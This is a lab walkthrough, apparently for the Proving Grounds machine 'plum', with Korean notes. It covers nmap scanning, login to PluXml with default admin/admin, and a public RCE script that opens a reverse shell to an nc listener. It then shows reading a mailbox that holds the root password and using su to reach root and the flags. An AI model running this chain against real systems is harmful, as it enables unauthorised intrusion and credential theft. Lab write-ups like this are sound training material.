---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/lin/suid
  - tech/lin/kernel-exploit
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.132.28
ports: [22, 80]
services: [http, ssh]
status: solved
tech_count: 3
---
## Nmap

```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ nnmap 192.168.132.28
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-29 12:41 +0900
Nmap scan report for 192.168.132.28
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: PluXml - Blog or CMS, XML powered !
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   65.25 ms 192.168.45.1
2   65.21 ms 192.168.45.254
3   65.73 ms 192.168.251.1
4   65.87 ms 192.168.132.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds
```

로그인 페이지 발견 후 초기패스워드로 로그인 `admin/admin`
![[Pasted image 20260629125057.png]]

info 페이지에서 버전 확인
![[Pasted image 20260629125819.png]]

RCE CVE 확인
![[Pasted image 20260629125838.png]]

payload 확보
![[Pasted image 20260629125852.png]]

https://github.com/erlaplante/pluxml-rce

payload 확보 후 실행
```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ git clone https://github.com/erlaplante/pluxml-rce.git
Cloning into 'pluxml-rce'...
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 5 (delta 0), reused 5 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (5/5), done.

┌──(kali㉿kali)-[~/PG/plum]
└─$ ls
nmap.log  pluxml-rce

┌──(kali㉿kali)-[~/PG/plum]
└─$ cd pluxml-rce

┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ ls
pluxml.py  README.md

┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ vi pluxml.py

┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ python pluxml.py
[-] Usage:   pluxml.py <URL> <UserName> <Password> <RHOST> <RPORT>
[-] Example: pluxml.py http://example.com admin pass123 192.168.10.10 443

┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ python pluxml.py http://192.168.132.28/ admin admin 192.168.45.156 4444
[+] Attempting login...
[+] Successfully logged in as: admin
[+] Attempting to modify template...
[+] Attemtping to save template...
[+] Check your listener...

```

![[Pasted image 20260629125932.png]]![[Pasted image 20260629125939.png]]

www-data 자격증명 확보
![[Pasted image 20260629130031.png]]
```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.132.28] 59858
bash: cannot set terminal process group (731): Inappropriate ioctl for device
bash: no job control in this shell
www-data@plum:/var/www/html$ whoami
whoami
www-data
www-data@plum:/var/www/html$ cd
cd
bash: cd: HOME not set
www-data@plum:/var/www/html$ cd /home
cd /home
www-data@plum:/home$
```

flag 확인
```bash
www-data@plum:/tmp$ cd /var/www
cd /var/www
www-data@plum:/var/www$ ls
ls
html
local.txt
www-data@plum:/var/www$ cat local.txt
cat local.txt
26780c227fb20c4d1eb303a7536de3bd
```
![[Pasted image 20260629140858.png]]

SUID 설정 파일 검색 -> exim4 실패

```bash
find / -perm -u=s 2>/dev/null
/usr/sbin/exim4
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/sudo
```

메일 박스 확인
![[Pasted image 20260629142834.png]]
![[Pasted image 20260629142856.png]]
```bash
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:25                  :::*                    LISTEN      -
cd /var/spool/mail

ls
www-data
cd www-data
/tmp/pwned: 8: cd: can't cd to www-data
ls
www-data
whoami
www-data
ls -al
total 16
drwxrwsr-x  2 root     mail 4096 Jun 29 01:12 .
drwxr-xr-x 12 root     root 4096 Aug 25  2023 ..
-rw-rw----  1 www-data mail 4528 Jun 29 01:12 www-data
cat www-data
From root@localhost Fri Aug 25 06:31:47 2023
Return-path: <root@localhost>
Envelope-to: www-data@localhost
Delivery-date: Fri, 25 Aug 2023 06:31:47 -0400
Received: from root by localhost with local (Exim 4.94.2)
        (envelope-from <root@localhost>)
        id 1qZU6V-0000El-Pw
        for www-data@localhost; Fri, 25 Aug 2023 06:31:47 -0400
To: www-data@localhost
From: root@localhost
Subject: URGENT - DDOS ATTACK"
Reply-to: root@localhost
Message-Id: <E1qZU6V-0000El-Pw@localhost>
Date: Fri, 25 Aug 2023 06:31:47 -0400

We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:
root:6s8kaZZNaZZYBMfh2YEW
Thanks,
Administrator

From MAILER-DAEMON Mon Jun 29 00:57:06 2026
Return-path: <>
Envelope-to: www-data@localhost
Delivery-date: Mon, 29 Jun 2026 00:57:06 -0400
Received: from Debian-exim by localhost with local (Exim 4.94.2)
        id 1we43O-0004AB-L4
        for www-data@localhost; Mon, 29 Jun 2026 00:57:06 -0400
X-Failed-Recipients: debian@localhost
Auto-Submitted: auto-replied
From: Mail Delivery System <Mailer-Daemon@localhost>
To: www-data@localhost
References: <E1we43O-00049l-KQ@localhost>
Content-Type: multipart/report; report-type=delivery-status; boundary=1782709026-eximdsn-212836836
MIME-Version: 1.0
Subject: Mail delivery failed: returning message to sender
Message-Id: <E1we43O-0004AB-L4@localhost>
Date: Mon, 29 Jun 2026 00:57:06 -0400

--1782709026-eximdsn-212836836
Content-type: text/plain; charset=us-ascii

This message was created automatically by mail delivery software.

A message that you sent could not be delivered to one or more of its
recipients. This is a permanent error. The following address(es) failed:

  debian@localhost
    (generated from root@localhost)
    Unrouteable address

--1782709026-eximdsn-212836836
Content-type: message/delivery-status

Reporting-MTA: dns; localhost

Action: failed
Final-Recipient: rfc822;root@localhost
Status: 5.0.0

--1782709026-eximdsn-212836836
Content-type: message/rfc822

Return-path: <www-data@localhost>
Received: from www-data by localhost with local (Exim 4.94.2)
        (envelope-from <www-data@localhost>)
        id 1we43O-00049l-KQ
        for root@localhost; Mon, 29 Jun 2026 00:57:06 -0400
To: root@localhost
Auto-Submitted: auto-generated
Subject: *** SECURITY information for localhost ***
From: www-data <www-data@localhost>
Message-Id: <E1we43O-00049l-KQ@localhost>
Date: Mon, 29 Jun 2026 00:57:06 -0400

localhost : Jun 29 04:57:06 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list


--1782709026-eximdsn-212836836--

From MAILER-DAEMON Mon Jun 29 01:12:46 2026
Return-path: <>
Envelope-to: www-data@localhost
Delivery-date: Mon, 29 Jun 2026 01:12:46 -0400
Received: from Debian-exim by localhost with local (Exim 4.94.2)
        id 1we4IY-000B9Y-F8
        for www-data@localhost; Mon, 29 Jun 2026 01:12:46 -0400
X-Failed-Recipients: debian@localhost
Auto-Submitted: auto-replied
From: Mail Delivery System <Mailer-Daemon@localhost>
To: www-data@localhost
References: <E1we4IY-000B9G-Eg@localhost>
Content-Type: multipart/report; report-type=delivery-status; boundary=1782709966-eximdsn-984777396
MIME-Version: 1.0
Subject: Mail delivery failed: returning message to sender
Message-Id: <E1we4IY-000B9Y-F8@localhost>
Date: Mon, 29 Jun 2026 01:12:46 -0400

--1782709966-eximdsn-984777396
Content-type: text/plain; charset=us-ascii

This message was created automatically by mail delivery software.

A message that you sent could not be delivered to one or more of its
recipients. This is a permanent error. The following address(es) failed:

  debian@localhost
    (generated from root@localhost)
    Unrouteable address

--1782709966-eximdsn-984777396
Content-type: message/delivery-status

Reporting-MTA: dns; localhost

Action: failed
Final-Recipient: rfc822;root@localhost
Status: 5.0.0

--1782709966-eximdsn-984777396
Content-type: message/rfc822

Return-path: <www-data@localhost>
Received: from www-data by localhost with local (Exim 4.94.2)
        (envelope-from <www-data@localhost>)
        id 1we4IY-000B9G-Eg
        for root@localhost; Mon, 29 Jun 2026 01:12:46 -0400
To: root@localhost
Auto-Submitted: auto-generated
Subject: *** SECURITY information for localhost ***
From: www-data <www-data@localhost>
Message-Id: <E1we4IY-000B9G-Eg@localhost>
Date: Mon, 29 Jun 2026 01:12:46 -0400

localhost : Jun 29 05:12:46 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list
```

root 획득 후 flag 확인
![[Pasted image 20260629142947.png]]

```bash
su -
Password: 6s8kaZZNaZZYBMfh2YEW
whoami
root
cat /root/proof.txt
b0d62860a794cb90eb6ac02cee93c579
```